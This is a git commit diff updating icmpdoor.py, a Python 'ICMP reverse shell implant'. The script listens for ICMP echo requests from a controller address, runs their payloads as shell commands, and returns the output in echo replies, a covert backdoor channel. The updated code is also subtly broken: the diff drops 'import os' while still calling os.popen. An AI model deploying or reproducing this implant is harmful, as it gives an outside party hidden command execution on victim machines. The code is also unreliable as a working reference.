52b18172ed73f795cf96342b092bd7e5fc434d5f
Jeroen van Kessel <krabbedoelie@hotmail.com>
2020-11-15 23:17:47 +0100

    Update icmpdoor.py

--- icmpdoor.py
+++ icmpdoor.py
@@ -1,12 +1,20 @@
 #!/usr/bin/env python3
+#ICMPdoor (IMCP reverse shell) [implant]
 #By krabelize | cryptsus.com
-#ICMPdoor (reverse shell) implant
-from scapy.all import *
+#More info: https://cryptsus.com/blog/icmp-reverse-shell.html
+from scapy.all import sr,IP,ICMP,Raw,sniff
+from os import popen
 import argparse
-import os
 
 #Variables
 icmp_id = int(13170)
+ttl = int(64)
+
+def check_scapy():
+    try:
+        from scapy.all import sr,IP,ICMP,Raw,sniff
+    except ImportError:
+        print("Install the Py3 scapy module")
 
 parser = argparse.ArgumentParser()
 parser.add_argument('-i', '--interface', type=str, required=True, help="(Virtual) Network Interface (e.g. eth0)")
@@ -15,11 +23,12 @@ args = parser.parse_args()
 
 def icmpshell(pkt):
     if pkt[IP].src == args.destination_ip and pkt[ICMP].type == 8 and pkt[ICMP].id == icmp_id and pkt[Raw].load:
-        newpkt = (pkt[Raw].load).decode('utf-8', errors='ignore')
-        payload = os.popen(newpkt).readlines()
-        icmppacket = (IP(dst=args.destination_ip)/ICMP(type=0, id=icmp_id)/Raw(load=payload))
+        icmppaket = (pkt[Raw].load).decode('utf-8', errors='ignore')
+        payload = os.popen(icmppaket).readlines()
+        icmppacket = (IP(dst=args.destination_ip, ttl=ttl)/ICMP(type=0, id=icmp_id)/Raw(load=payload))
         sr(icmppacket, timeout=0, verbose=0)
     else:
         pass
 
+print("[+]ICMP listener started!")
 sniff(iface=args.interface, prn=icmpshell, filter="icmp", store="0")
